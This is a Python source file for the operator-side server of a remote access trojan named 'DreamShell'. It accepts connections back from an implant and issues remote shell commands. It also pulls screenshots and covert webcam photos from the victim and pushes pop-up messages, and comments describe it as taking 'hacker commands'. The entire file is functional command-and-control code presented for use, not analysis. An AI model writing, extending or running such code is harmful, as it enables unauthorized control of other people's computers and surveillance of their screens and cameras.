import socket
import threading
import time
import sys


RESV_ACCOMPLISH = "SQ223!!@@##$$77&&ttyy"
sem = threading.Semaphore(100)


class server:
    def __init__(self, host, port):
        self.newsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.newsocket.bind((str(host), port))
        self.newsocket.listen(1)
        # 开始监听显示信息
        self.host = str(host)
        self.port = port

    def __del__(self):
        print("Service Stopped!")
        pass

    def getPic(self, conne, order):
        conne.send((order + RESV_ACCOMPLISH).encode("utf-8"))
        length = self.recv_data(conne)
        print(str(order) + "-Len: " + length)
        length = int(length)
        # 收到文件长度，返回确认请求，准备接收
        conne.send(("ok" + RESV_ACCOMPLISH).encode("utf-8"))
        i = 0
        img_data = b''
        while i < length:
            img_data = img_data + conne.recv(1024)
            # 每次接收到1024长度的文件
            conne.send(("ok" + RESV_ACCOMPLISH).encode("utf-8"))
            # 确认自己已经接收到数据
            i += 1
        res_im = open("./" + str(order) + str(time.time())[-3:] + ".png", "wb")
        res_im.write(img_data)
        print(str(order) + " saved! File name is: " + res_im.name)
        res_im.close()

    def process_handler(self):
        with sem:
            time.sleep(2)
            print("Service Launch! Listen on ", str(self.host), ":", str(self.port))
            conne, addr = self.newsocket.accept()
            print("Starting convert with ", addr)
            self.process_msg(conne, addr)
            # th1 = threading.Thread(target=self.process_msg, args=(conne, addr))
            # th2 = threading.Thread(target=self.toexit)
            # th1.start()
            # th2.start()
            return

    def toexit(self):
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("KeyBoard Interrupt!")
            exit(-1)

    # 接受黑客命令
    def hackerscan(self, client_name, isshell):
        client_name.strip(",")
        while True:
            if isshell == 0:
                order = input(time.asctime() + "\n" + client_name[1:-1] + " (command)>")
            else:
                order = input(time.asctime() + "\n" + client_name[1:-1] + " (shell)>")
            if order == "":
                print("Empty order or command...retry.")
                continue
            else:
                return order

    def recv_data(self, conne):
        resp = b''
        while True:
            # 在文件末尾添加一定规则的标识符，如果有这个标识符，那就表示读取完毕
            tmp = conne.recv(512)
            resp = resp + tmp
            # 如果没有读取完毕那就继续进行读取
            if RESV_ACCOMPLISH.encode("utf-8") not in resp:
                continue
            else:
                return resp.decode("utf-8")[:-21]

    def chat_box(self, conne, order):
        conne.send((order+RESV_ACCOMPLISH).encode("utf-8"))
        chatquery = self.recv_data(conne)
        if chatquery == "ok_CHAT":
            print("Step into Chat module successful.")
            msg = input("What Msg do U want 2 send :>")
            msgtype = input("Msg type: 1.info 2.warn 3.error :>")
            data_to_send = msg + "SEEUNEXTTIME!" +msgtype
            # 发送指令
            conne.send((data_to_send+RESV_ACCOMPLISH).encode("utf-8"))
            query_twice = self.recv_data(conne)
            if query_twice == "ok_POP":
                print("Msg send successfully!")
            else:
                print("Msg sent by no query.")
        else:
            print("Something wrong occurred! Please retry.")

    def process_msg(self, conne, addr):
        isshell = 0
        while True:
            # 从这里接受键盘命令

            order = self.hackerscan(str(addr), isshell)
            # 当检测到键入了退出的命令，那么就关闭链接，进行下一个监听

            if order == "exit":
                conne.send((order + RESV_ACCOMPLISH).encode("utf-8"))
                # 发送结束的指令
                print(addr, "Waiting handler to exit...")
                time.sleep(2)
                try:
                    time.sleep(0.5)
                    exit_query = self.recv_data(conne)
                    print("The handler is exited successfully: " + exit_query)
                    conne.close()
                except:
                    print("The handler is may exited but not query.")
                return

            if order == "restart":
                conne.send((order + RESV_ACCOMPLISH).encode("utf-8"))
                conne.close()
                print("The handler will be restarted....Waiting...")
                return

            if order == "shell":
                isshell = 1
                conne.send((order + RESV_ACCOMPLISH).encode("utf-8"))
                resp = self.recv_data(conne)
                print(resp)
                while True:
                    # 如果没有检测到退出的命令，那么就把shell发送出去，并且监听回复内容
                    order = self.hackerscan(str(addr), isshell)
                    if order == "exit":
                        print("Back on command...")
                        conne.send(("exitSHELL" + RESV_ACCOMPLISH).encode("utf-8"))
                        isshell = 0
                        break
                    else:
                        conne.send((order + RESV_ACCOMPLISH).encode("utf-8"))
                    try:
                        time.sleep(0.5)
                        resp = self.recv_data(conne)
                        print(resp)
                    except:
                        print("None")

            if order == "screenshot":
                self.getPic(conne, order)
                continue

            if order == "camerashot":
                self.getPic(conne, order)
                continue

            if order == "chatbox":
                self.chat_box(conne, order)
                continue

            else:
                pass

if __name__ == "__main__":
    raddr = ""
    rport = ""
    commandlist = sys.argv
    if len(commandlist) == 1 or len(commandlist) == 2 and (commandlist[1][1:] == "h" or commandlist[1][2:] == "help"):
        print('''
                DreamShell ---> HELP DOCUMENT
                -----------------------------
                Launch service:   Server -a [--addr] (you ip) -p [--port] (your port)
                when in command:   [command]
                when in shell:  [cmd-shell]  or  [bash-shell]
                -----------------------------
                Some useful commands:
                exit --> close the handler and stop the client process
                restart --> restart the handler
                screenshot --> take a screenshot on the screen
                camerashot --> take a photo use the camera on the client
            ''')

    elif len(commandlist) == 5 and (commandlist[1][1:] == "a" and commandlist[3][1:] == "p"):
        raddr = commandlist[2]
        rport = commandlist[4]
        print(raddr, rport)

    elif len(commandlist) == 5 and (commandlist[1][2:] == "addr" and commandlist[3][1:] == "port"):
        raddr = commandlist[2]
        rport = commandlist[4]
        print(raddr, rport)

    else:
        print('Unknown Command...\nYou can use "Server -h [--help] to check the document"')

    try:
        new_server = server(raddr, int(rport))
        while True:
            new_server.process_handler()
    # To keep alive and continually connect
    # keep_alived = server("0.0.0.0", 1235)
    except:
        print("The addr or port seems not useful!")
        print("Please try again!")

